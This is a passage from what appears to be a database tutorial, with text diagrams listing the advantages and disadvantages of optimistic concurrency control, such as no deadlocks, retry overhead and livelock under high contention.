<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    OPTIMISTIC CONTROL - ADVANTAGES                      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. \u2705 NO BLOCKING - MAXIMUM CONCURRENCY                 \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Transactions never wait for each other   \u2502         \u2502\n\u2502 \u2502 \u2022 All execute in parallel                  \u2502         \u2502\n\u2502 \u2502 \u2022 Maximum CPU utilization                  \u2502         \u2502\n\u2502 \u2502 \u2022 Highest possible throughput              \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Example:                                   \u2502         \u2502\n\u2502 \u2502 1000 transactions:                         \u2502         \u2502\n\u2502 \u2502 \u2022 All read simultaneously (no waiting)     \u2502         \u2502\n\u2502 \u2502 \u2022 All process simultaneously               \u2502         \u2502\n\u2502 \u2502 \u2022 Validation happens at commit only        \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Throughput:                                \u2502         \u2502\n\u2502 \u2502 Low contention: 10x faster than pessimistic\u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 2. \u2705 NO DEADLOCKS                                      \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 No locks \u2192 No circular dependencies      \u2502         \u2502\n\u2502 \u2502 \u2022 Eliminates deadlock complexity           \u2502         \u2502\n\u2502 \u2502 \u2022 No deadlock detection needed             \u2502         \u2502\n\u2502 \u2502 \u2022 No victim selection required             \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Simplification:                            \u2502         \u2502\n\u2502 \u2502 \u2022 No lock ordering protocols               \u2502         \u2502\n\u2502 \u2502 \u2022 No deadlock timeouts                     \u2502         \u2502\n\u2502 \u2502 \u2022 No wait-for graphs                       \u2502         \u2502\n\u2502 \u2502 \u2022 One less failure mode to handle          \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 3. \u2705 LOWER OVERHEAD (NO LOCK MANAGEMENT)               \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 No lock structures in memory             \u2502         \u2502\n\u2502 \u2502 \u2022 No lock acquisition/release cost         \u2502         \u2502\n\u2502 \u2502 \u2022 No deadlock detection overhead           \u2502         \u2502\n\u2502 \u2502 \u2022 Minimal database metadata                \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Resource savings:                          \u2502         \u2502\n\u2502 \u2502 \u2022 Memory: No lock tables                   \u2502         \u2502\n\u2502 \u2502 \u2022 CPU: No lock manager overhead            \u2502         \u2502\n\u2502 \u2502 \u2022 Just version number or timestamp         \u2502         \u2502\n\u2502 \u2502   (4-8 bytes per row)                      \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 4. \u2705 EXCELLENT FOR READ-HEAVY WORKLOADS                \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Readers never block each other           \u2502         \u2502\n\u2502 \u2502 \u2022 Readers don't block writers              \u2502         \u2502\n\u2502 \u2502 \u2022 Writers don't block readers              \u2502         \u2502\n\u2502 \u2502 \u2022 Perfect for 90% read, 10% write          \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Use cases:                                 \u2502         \u2502\n\u2502 \u2502 \u2022 Content management systems               \u2502         \u2502\n\u2502 \u2502 \u2022 Product catalogs                         \u2502         \u2502\n\u2502 \u2502 \u2022 User profiles                            \u2502         \u2502\n\u2502 \u2502 \u2022 Reference data                           \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Performance:                               \u2502         \u2502\n\u2502 \u2502 90% reads: 5-10x faster than pessimistic   \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 5. \u2705 BETTER FOR DISTRIBUTED SYSTEMS                    \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 No distributed lock coordination         \u2502         \u2502\n\u2502 \u2502 \u2022 No network overhead for locks            \u2502         \u2502\n\u2502 \u2502 \u2022 Scales horizontally easily               \u2502         \u2502\n\u2502 \u2502 \u2022 Works well with replication              \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Distributed benefits:                      \u2502         \u2502\n\u2502 \u2502 \u2022 Each node operates independently         \u2502         \u2502\n\u2502 \u2502 \u2022 No cross-node lock messages              \u2502         \u2502\n\u2502 \u2502 \u2022 Conflict detection at commit (local)     \u2502         \u2502\n\u2502 \u2502 \u2022 Network partitions less problematic      \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Examples:                                  \u2502         \u2502\n\u2502 \u2502 \u2022 DynamoDB (optimistic by default)         \u2502         \u2502\n\u2502 \u2502 \u2022 Cosmos DB (uses ETags)                   \u2502         \u2502\n\u2502 \u2502 \u2022 Cassandra (lightweight transactions)     \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 6. \u2705 LOWER LATENCY IN LOW CONTENTION                   \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 No lock acquisition delay                \u2502         \u2502\n\u2502 \u2502 \u2022 No waiting in queues                     \u2502         \u2502\n\u2502 \u2502 \u2022 Immediate execution                      \u2502         \u2502\n\u2502 \u2502 \u2022 Faster response times                    \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Latency comparison (low contention):       \u2502         \u2502\n\u2502 \u2502 Pessimistic: 50-100ms (lock overhead)      \u2502         \u2502\n\u2502 \u2502 Optimistic:  5-10ms (no locks)             \u2502         \u2502\n\u2502 \u2502 \u2192 5-10x faster!                            \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 7. \u2705 SIMPLER LOCK-FREE DESIGN                          \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 No complex lock hierarchies              \u2502         \u2502\n\u2502 \u2502 \u2022 No lock ordering concerns                \u2502         \u2502\n\u2502 \u2502 \u2022 No lock escalation issues                \u2502         \u2502\n\u2502 \u2502 \u2022 Easier mental model                      \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Design simplicity:                         \u2502         \u2502\n\u2502 \u2502 \u2022 Read \u2192 Modify \u2192 Validate \u2192 Commit        \u2502         \u2502\n\u2502 \u2502 \u2022 Version check at end                     \u2502         \u2502\n\u2502 \u2502 \u2022 Retry on conflict                        \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 8. \u2705 NO PRIORITY INVERSION                             \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 No locks means no priority inversion     \u2502         \u2502\n\u2502 \u2502 \u2022 High priority tasks not blocked          \u2502         \u2502\n\u2502 \u2502 \u2022 Fair scheduling possible                 \u2502         \u2502\n\u2502 \u2502 \u2022 Better for real-time systems             \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 9. \u2705 WORKS WELL WITH CACHING                           \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Read from cache without locks            \u2502         \u2502\n\u2502 \u2502 \u2022 Invalidate cache on version change       \u2502         \u2502\n\u2502 \u2502 \u2022 Version numbers enable cache coherence   \u2502         \u2502\n\u2502 \u2502 \u2022 Easy cache integration                   \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Cache pattern:                             \u2502         \u2502\n\u2502 \u2502 1. Read from cache (fast)                  \u2502         \u2502\n\u2502 \u2502 2. Modify locally                          \u2502         \u2502\n\u2502 \u2502 3. Validate version before commit          \u2502         \u2502\n\u2502 \u2502 4. Update cache on success                 \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Disadvantages:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    OPTIMISTIC CONTROL - DISADVANTAGES                   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. \u274c WASTED WORK ON CONFLICTS                          \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Transaction aborted = all work lost      \u2502         \u2502\n\u2502 \u2502 \u2022 CPU cycles wasted                        \u2502         \u2502\n\u2502 \u2502 \u2022 Memory allocations wasted                \u2502         \u2502\n\u2502 \u2502 \u2022 Must redo from beginning                 \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Example:                                   \u2502         \u2502\n\u2502 \u2502 Complex report (10 seconds processing):    \u2502         \u2502\n\u2502 \u2502 \u2022 10 seconds of CPU work                   \u2502         \u2502\n\u2502 \u2502 \u2022 Validation fails at end                  \u2502         \u2502\n\u2502 \u2502 \u2022 All 10 seconds WASTED!                   \u2502         \u2502\n\u2502 \u2502 \u2022 Must restart from scratch                \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Impact:                                    \u2502         \u2502\n\u2502 \u2502 High contention (50% conflict rate):       \u2502         \u2502\n\u2502 \u2502 \u2022 50% of all work is wasted                \u2502         \u2502\n\u2502 \u2502 \u2022 Effective throughput halved              \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 2. \u274c RETRY OVERHEAD AND COMPLEXITY                     \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Need retry logic in application          \u2502         \u2502\n\u2502 \u2502 \u2022 Exponential backoff implementation       \u2502         \u2502\n\u2502 \u2502 \u2022 Max retry limit handling                 \u2502         \u2502\n\u2502 \u2502 \u2022 Complex error handling                   \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Required code:                             \u2502         \u2502\n\u2502 \u2502 \u2022 Retry loop with backoff                  \u2502         \u2502\n\u2502 \u2502 \u2022 Conflict detection                       \u2502         \u2502\n\u2502 \u2502 \u2022 Error categorization                     \u2502         \u2502\n\u2502 \u2502 \u2022 User feedback on retries                 \u2502         \u2502\n\u2502 \u2502 \u2022 Monitoring retry rates                   \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Complexity added:                          \u2502         \u2502\n\u2502 \u2502 \u2022 50-100+ lines of retry code              \u2502         \u2502\n\u2502 \u2502 \u2022 Testing retry scenarios                  \u2502         \u2502\n\u2502 \u2502 \u2022 Debugging intermittent failures          \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 3. \u274c STARVATION POSSIBLE (LIVELOCK)                    \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Transaction may never succeed            \u2502         \u2502\n\u2502 \u2502 \u2022 Continuously retrying, always failing    \u2502         \u2502\n\u2502 \u2502 \u2022 No guaranteed completion                 \u2502         \u2502\n\u2502 \u2502 \u2022 Fairness not guaranteed                  \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Scenario:                                  \u2502         \u2502\n\u2502 \u2502 T1 keeps winning, T2 keeps losing:         \u2502         \u2502\n\u2502 \u2502 T2: Try \u2192 Fail \u2192 Retry \u2192 Fail \u2192 Retry...  \u2502         \u2502\n\u2502 \u2502 \u2191 May never complete!                      \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Mitigation needed:                         \u2502         \u2502\n\u2502 \u2502 \u2022 Priority-based backoff                   \u2502         \u2502\n\u2502 \u2502 \u2022 Max retry then switch to pessimistic     \u2502         \u2502\n\u2502 \u2502 \u2022 Jittered delays                          \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 4. \u274c UNPREDICTABLE PERFORMANCE                         \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Response time varies widely              \u2502         \u2502\n\u2502 \u2502 \u2022 Depends on contention level              \u2502         \u2502\n\u2502 \u2502 \u2022 Can suddenly degrade                     \u2502         \u2502\n\u2502 \u2502 \u2022 Difficult to give SLA guarantees         \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Latency variance:                          \u2502         \u2502\n\u2502 \u2502 Attempt 1: 10ms                            \u2502         \u2502\n\u2502 \u2502 Attempt 2: 30ms (1 retry)                  \u2502         \u2502\n\u2502 \u2502 Attempt 3: 70ms (2 retries)                \u2502         \u2502\n\u2502 \u2502 Attempt 4: 150ms (3 retries)               \u2502         \u2502\n\u2502 \u2502 \u2192 Highly variable!                         \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 P50: 10ms, P95: 150ms, P99: 500ms          \u2502         \u2502\n\u2502 \u2502 (vs pessimistic: P50/P95/P99 all ~50ms)    \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 5. \u274c UNSUITABLE FOR HIGH CONTENTION                    \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Conflict rate increases exponentially    \u2502         \u2502\n\u2502 \u2502 \u2022 Retry storm cascades                     \u2502         \u2502\n\u2502 \u2502 \u2022 System thrashing                         \u2502         \u2502\n\u2502 \u2502 \u2022 Throughput collapses                     \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Math:                                      \u2502         \u2502\n\u2502 \u2502 N transactions competing:                  \u2502         \u2502\n\u2502 \u2502 \u2022 Success rate: 1/N                        \u2502         \u2502\n\u2502 \u2502 \u2022 Expected retries: N-1 per transaction    \u2502         \u2502\n\u2502 \u2502 \u2022 Total work: O(N\u00b2)                        \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Example (N=100):                           \u2502         \u2502\n\u2502 \u2502 \u2022 99% transactions fail first try          \u2502         \u2502\n\u2502 \u2502 \u2022 Average 99 retries each                  \u2502         \u2502\n\u2502 \u2502 \u2022 System overloaded!                       \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 6. \u274c VALIDATION OVERHEAD                               \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Version check at every commit            \u2502         \u2502\n\u2502 \u2502 \u2022 Additional database round trip           \u2502         \u2502\n\u2502 \u2502 \u2022 Conditional UPDATE complexity            \u2502         \u2502\n\u2502 \u2502 \u2022 Index overhead for version columns       \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 Overhead per transaction:                  \u2502         \u2502\n\u2502 \u2502 \u2022 Read version: 1-5ms                      \u2502         \u2502\n\u2502 \u2502 \u2022 Validate + update: 2-10ms                \u2502         \u2502\n\u2502 \u2502 \u2022 Total: 3-15ms added latency              \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 7. \u274c DIFFICULT USER EXPERIENCE                         \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Users see \"conflict\" errors              \u2502         \u2502\n\u2502 \u2502 \u2022 Need to re-enter data                    \u2502         \u2502\n\u2502 \u2502 \u2022 Frustrating experience                   \u2502         \u2502\n\u2502 \u2502 \u2022 Requires good UX design                  \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 User sees:                                 \u2502         \u2502\n\u2502 \u2502 \"Someone else modified this record.        \u2502         \u2502\n\u2502  Please refresh and try again.\"              \u2502         \u2502\n\u2502 \u2502                                            \u2502         \u2502\n\u2502 \u2502 vs Pessimistic:                            \u2502         \u2502\n\u2502 \u2502 User just waits (transparent)              \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 8. \u274c CANNOT HANDLE EXTERNAL SIDE EFFECTS               \u2502\n\u2502 